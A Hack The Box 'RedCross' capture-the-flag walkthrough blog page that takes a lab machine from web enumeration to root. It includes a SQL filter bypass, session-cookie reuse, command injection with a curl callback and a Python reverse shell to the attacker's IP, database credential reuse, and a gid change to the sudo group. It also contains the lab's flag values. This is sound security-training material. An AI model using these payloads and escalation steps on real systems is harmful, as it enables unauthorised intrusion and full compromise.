@@ -1,0 +1,454 @@
+---
+layout: default
+title: RedCross
+---
+
+<div class="pretty-font">
+<h1>RedCross</h1>
+<p class="date">13/04/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/redcross/redcross.png">
+
+<p>RedCross is a box which requires some web enumeration to access to the depths of its websites, there it's easy to get a shell but it's a restricted one that will get you nowhere. My way to obtain a good shell involves exploiting a command injection vulnerability and to escalate privileges modifying some registers in a database to change user permissions.</p>
+
+<hr>
+
+<p>First run <code>nmap</code> to see we have <code>ssh/22</code>, <code>http/80</code> and <code>https/443</code> available in the RedCross.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/redcross# nmap -sC -sV 10.10.10.113
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-13 14:44 UTC
+Nmap scan report for 10.10.10.113
+Host is up (0.18s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA)
+|   256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA)
+|_  256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.25
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Did not follow redirect to https://intra.redcross.htb/
+443/tcp open  ssl/http Apache httpd 2.4.25
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Did not follow redirect to https://intra.redcross.htb/
+| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
+| Not valid before: 2018-06-03T19:46:58
+|_Not valid after:  2021-02-27T19:46:58
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+</pre>
+
+<p>If we make a <code>GET</code> request to the Apache server in port 80, we get redirected to <code>https://intra.redcross.htb/</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/redcross# curl 10.10.10.113
+&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+&lt;html>&lt;head>
+&lt;title>301 Moved Permanently&lt;/title>
+&lt;/head>&lt;body>
+&lt;h1>Moved Permanently&lt;/h1>
+&lt;p>The document has moved &lt;a href="https://intra.redcross.htb/">here&lt;/a>.&lt;/p>
+&lt;hr>
+&lt;address>Apache/2.4.25 (Debian) Server at 10.10.10.113 Port 80&lt;/address>
+&lt;/body>&lt;/html>
+</pre>
+
+<p>So let's add the route to <code>/etc/hosts</code>.</p> 
+
+<pre class="prettyprint">
+10.10.10.113	intra.redcross.htb
+</pre>
+
+<p>Now we can navigate to the website where we get prompted with a login panel.</p>
+
+<img class="img-fluid" src="/static/img/htb/redcross/1.png">
+
+<p>Let's use <code>wfuzz</code> to try to discover some web content.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/redcross# wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404,403 https://intra.redcross.htb/FUZZ
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://intra.redcross.htb/FUZZ
+Total requests: 4614
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000001:  C=302      0 L	      26 W	    463 Ch	  ""
+001324:  C=301      9 L	      28 W	    334 Ch	  "documentation"
+001991:  C=301      9 L	      28 W	    327 Ch	  "images"
+002021:  C=302      0 L	      26 W	    463 Ch	  "index.php"
+002145:  C=301      9 L	      28 W	    331 Ch	  "javascript"
+002844:  C=301      9 L	      28 W	    326 Ch	  "pages"
+</pre>
+
+<p>We got some directories and after running thousands of word lists against those, using <code>dirbuster/directory-list-lowercase-2.3-small.txt</code> we can find a pdf file under <code>documentation</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/redcross# wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -z list,-.pdf --hc 404,403 https://intra.redcross.htb/documentation/FUZZFUZ2Z
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.3.1 - The Web Fuzzer                         *
+********************************************************
+
+Target: https://intra.redcross.htb/documentation/FUZZFUZ2Z
+Total requests: 163286
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload    
+==================================================================
+
+087266:  C=200    259 L	    1220 W	  24694 Ch	  "account-signup - .pdf"
+</pre>
+
+<p>In this pdf we have the instructions to request access to the intranet and also the name of one of the IT dept. workers.</p>
+
+<img class="img-fluid" src="/static/img/htb/redcross/2.png">
+<img class="img-fluid" src="/static/img/htb/redcross/2.5.png">
+
+<p>If we follow those steps and request credentials, we get the following message.</p>
+
+<p class="challenge-description">
+We are processing your request. Temporary credentials have granted for you:<br>
+   guest:guest
+</p>
+
+<p>We can access with <code>guest/guest</code> to the intranet where we have a view with our messages and an input to filter by <code>UserID</code>.</p>
+
+<img class="img-fluid" src="/static/img/htb/redcross/3.png">
+
+<p>The URL structure to filter is <code>https://intra.redcross.htb/?o=1&page=app</code>. If we change the value of <code>o</code> to <code>o=1%20or%20%271%27=%271</code> to try to make a sqli we get the following error.</p>
+
+<img class="img-fluid" src="/static/img/htb/redcross/4.png">
+
+<p>Through the error message we can see the query used is <code>...'5' or dest like 'OUR INPUT') LIMIT 10</code>. Knowing this, we can use <code>https://intra.redcross.htb/?o=%&page=app</code> to have <code>or dest like '%'</code> in the query which is always <code>true</code> and will return all results.</p>
+
+<img class="img-fluid" src="/static/img/htb/redcross/5.png">
+
+<p>Reading the comments from other users we see they're always talking about an admin panel, so let's try to add the following route to <code>/etc/hosts</code> too.</p>
+
+<pre class="prettyprint">
+10.10.10.113	admin.redcross.htb
+</pre>
+
+<p>Now we can also access to <code>https://admin.redcross.htb</code> and we get another login panel.</p>
+
+<img class="img-fluid" src="/static/img/htb/redcross/6.png">
+
+<p>If we try to use the same credentials <code>guest/guest</code> we get the error <i>Not enough privileges!</i>, but if we replace the <code>PHPSESSID</code> cookie value of <code>admin.redcross.htb</code> for the one we have in <code>intra.redcross.htb</code> which is valid, we can access the IT Admin panel.</p>
+
+<img class="img-fluid" src="/static/img/htb/redcross/7.png">
+
+<img class="img-fluid" src="/static/img/htb/redcross/8.png">
+
+<p>If we go to the <i>Network Access</i> page we get presented with an input field where we can write an IP to whitelist. And, of course, we allow our IP.</p>
+
+<img class="img-fluid" src="/static/img/htb/redcross/9.png">
+
+<p class="challenge-description">DEBUG: All checks passed... Executing iptables Network access granted to 10.10.16.35 Network access granted to 10.10.16.35</p>
+
+<p>On the other page, we have a similar view where we can add users.</p>
+
+<img class="img-fluid" src="/static/img/htb/redcross/10.png">
+
+<p>If we add one user, we get a random password.</p>
+
+<p class="challenge-description">
+Provide this credentials to the user:<br>
+manolo : NIFmPpCb<br>
+Continue
+</p>
+
+<p>We can use that password to connect through <code>ssh</code> to the machine.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/redcross# ssh manolo@10.10.10.113
+manolo@10.10.10.113's password: NIFmPpCb
+Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+$ 
+</pre>
+
+<p>Unfortunately, there's almost anything here, which would let us think we're not in the right place.</p>
+
+<pre class="prettyprint">
+$ ls -la
+total 40
+drwxr-xr-x 10 root root       4096 Jun  8  2018 .
+drwxr-xr-x 10 root root       4096 Jun  8  2018 ..
+drwxr-xr-x  2 root root       4096 Jun  8  2018 bin
+drwxr-xr-x  2 root root       4096 Jun  7  2018 dev
+drwxr-xr-x  3 root root       4096 Jun  8  2018 etc
+drwxr-xr-x  4 root associates 4096 Jun  9  2018 home
+drwxr-xr-x  3 root root       4096 Jun  8  2018 lib
+drwxr-xr-x  2 root root       4096 Jun  7  2018 lib64
+drwx------  2 root root       4096 Jun  7  2018 root
+drwxr-xr-x  4 root root       4096 Jun  7  2018 usr
+</pre>
+
+<p>After some enumeration I didn't found anything interesting, so I came back to the website where I started inspecting all the requests and found something in the deny IP POST request.</p>
+
+<img class="img-fluid" src="/static/img/htb/redcross/11.png">
+
+<p>The request has the following structure.</p>
+
+<pre class="prettyprint">
+POST /pages/actions.php HTTP/1.1
+Host: admin.redcross.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://admin.redcross.htb/?page=firewall
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 61
+Cookie: PHPSESSID=c0mdtr4jh61on93mj06o46ins5
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+ip=10.10.13.32&id=12&action=deny
+</pre>
+
+<p>We can change the <code>data</code> to try to make a command injection and run a <code>curl</code> to our machine.</p>
+
+<pre class="prettyprint">
+ip=10.10.13.32;curl http://10.10.16.35/caca&id=12&action=deny
+</pre>
+
+<p>And if we were listening, we get the GET request from redcross, so it worked.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/redcross# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+10.10.10.113 - - [14/Feb/2019 08:21:23] code 404, message File not found
+10.10.10.113 - - [14/Feb/2019 08:21:23] "GET /caca HTTP/1.1" 404 -
+</pre>
+
+<p>Now replace <code>curl</code> for a reverse shell command.</p> 
+
+<pre class="prettyprint">
+ip=10.10.13.32;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.35",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'&id=12&action=deny
+</pre>
+
+<p>If we listen on the specified port we get a different shell from the <code>ssh</code> one.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/redcross# nc -nlvp 6969
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+Ncat: Connection from 10.10.10.113.
+Ncat: Connection from 10.10.10.113:34792.
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ hostname
+redcross
+</pre>
+
+<p>Upgrade the shell to a fully interactive one, because we will later need it.</p>
+
+<pre class="prettyprint">
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+www-data@redcross:/var/www/html/admin/pages$ 
+Ctrl+z
+root@kali:~/htb/redcross# stty raw -echo
+root@kali:~/htb/redcross# fg
+www-data@redcross:/var/www/html/admin/pages$
+</pre>
+
+<p>Now we can inspect the website code and see it uses different databases to store all the data.</p> 
+
+<pre class="prettyprint">
+www-data@redcross:/var/www/html/admin/pages$ cat actions.php
+...
+$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
+...
+$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
+$result = pg_prepare($dbconn, "q1", "insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, '/var/jail/home')");
+...
+</pre>
+
+<p>We see it is setting <code>/var/jail/home</code> as <code>homedir</code> for the users we create and in that directory we have the environment we had when accessing by <code>ssh</code>.</p>
+
+<pre class="prettyprint">
+www-data@redcross:/var/jail$ ls -la
+total 40
+drwxr-xr-x 10 root root       4096 Jun  8  2018 .
+drwxr-xr-x 13 root root       4096 Jun  7  2018 ..
+drwxr-xr-x  2 root root       4096 Jun  8  2018 bin
+drwxr-xr-x  2 root root       4096 Jun  7  2018 dev
+drwxr-xr-x  3 root root       4096 Jun  8  2018 etc
+drwxr-xr-x  4 root associates 4096 Jun  9  2018 home
+drwxr-xr-x  3 root root       4096 Jun  8  2018 lib
+drwxr-xr-x  2 root root       4096 Jun  7  2018 lib64
+drwx------  2 root root       4096 Jun  7  2018 root
+drwxr-xr-x  4 root root       4096 Jun  7  2018 usr
+</pre>
+
+<p>In the code, we can also see the function that caused the command injection.</p>
+
+<pre class="prettyprint">
+if($action==='deny'){
+	header('refresh:1;url=/?page=firewall');
+	$id=$_POST['id'];
+	$ip=$_POST['ip'];
+	$dbconn = pg_connect("host=127.0.0.1 dbname=redcross user=www password=aXwrtUO9_aa&");
+	$result = pg_prepare($dbconn, "q1", "DELETE FROM ipgrants WHERE id = $1");
+	$result = pg_execute($dbconn, "q1", array($id));
+	echo system("/opt/iptctl/iptctl restrict ".$ip);
+}
+</pre>
+
+<p>Instead of running just <code>iptctl</code> we make it execute different commands in that system call.</p>
+
+<pre class="prettyprint">
+echo system("/opt/iptctl/iptctl restrict 10.10.13.32;curl http://10.10.16.35/caca");
+</pre>
+
+<p>We're going to connect to the database which stores the users using <code>psql</code>. That's why we need a fully interactive shell, because if not <code>psql</code> won't work right.</p>
+
+<pre class="prettyprint">
+www-data@redcross:/var/www/html/admin/pages$ psql -h 127.0.0.1 -d unix -U unixusrmgr -W
+Password for user unixusrmgr: dheu%7wjx8B&
+
+psql (9.6.7)
+SSL connection (protocol: TLSv1.2, cipher: ECDHE-RSA-AES256-GCM-SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+unix=> 
+</pre>
+
+<p>Run <code>\dt</code> to list all tables.</p>
+
+<pre class="prettyprint">
+unix=> \dt
+WARNING: terminal is not fully functional
+            List of relations
+ Schema |     Name     | Type  |  Owner   
+--------+--------------+-------+----------
+ public | group_table  | table | postgres
+ public | passwd_table | table | postgres
+ public | shadow_table | table | postgres
+ public | usergroups   | table | postgres
+(4 rows)
+</pre>
+
+<p>In <code>passwd_table</code> we have all users with their hashed passwords and their properties.</p>
+
+<pre class="prettyprint">
+unix=> select * from passwd_table;
+WARNING: terminal is not fully functional
+ username  |               passwd               | uid  | gid  | gecos |    homedir     |   shell   
+-----------+------------------------------------+------+------+-------+----------------+-----------
+ manolo    | $1$hfJN6kKn$Qgjgd9Pjv8V4Z9TZJeLVb/ | 2031 | 1001 |       | /var/jail/home | /bin/bash
+(1 row)
+</pre>
+
+<p>What we're going to do is modify the main group of our user changing the <code>gid</code> value from <code>associates(1001)</code> to <code>sudo(27)</code>.</p>
+
+<pre class="prettyprint">
+www-data@redcross:/var/www/html/admin/pages$ cat /etc/group
+root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:penelope
+tty:x:5:
+disk:x:6:
+lp:x:7:
+mail:x:8:
+news:x:9:
+uucp:x:10:
+man:x:12:
+proxy:x:13:
+kmem:x:15:
+dialout:x:20:
+fax:x:21:
+voice:x:22:
+cdrom:x:24:penelope
+floppy:x:25:penelope
+tape:x:26:
+sudo:x:27:
+...
+associates:x:1001:
+...
+</pre>
+
+<p>Run the following query to change the values for our user.</p>
+
+<pre class="prettyprint">
+unix=> update passwd_table set gid=27 where username='manolo';
+UPDATE 1
+</pre>
+
+<p>Now our user is in sudoers group and should be able to run everything with <code>sudo</code> as a privileged user.</p>
+
+<p>Wait a couple of minutes to let the changes persist, access as our user through <code>ssh</code> and we should get a different shell.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/redcross# ssh manolo@10.10.10.113
+manolo@10.10.10.113's password: NIFmPpCb
+Linux redcross 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Feb 14 11:49:50 2019 from 10.10.16.35
+manolo@redcross:~$ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for manolo: NIFmPpCb
+Matching Defaults entries for manolo on redcross:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User manolo may run the following commands on redcross:
+    (ALL : ALL) ALL
+</pre>
+
+<p>We can directly change to <code>root</code> with <code>sudo su</code>.</p>
+
+<pre class="prettyprint">
+manolo@redcross:/$ sudo su
+root@redcross:/# 
+</pre>
+
+<p>Now we can read both flags.</p>
+
+<pre class="prettyprint">
+root@redcross:~# cat root.txt
+<span flag="892a1f4d018e5d382c4f5ee1b26717a4">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<pre class="prettyprint">
+root@redcross:/home/penelope# cat user.txt 
+<span flag="ac899bd46f7b014a369fbb60e53329bf">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+</div>
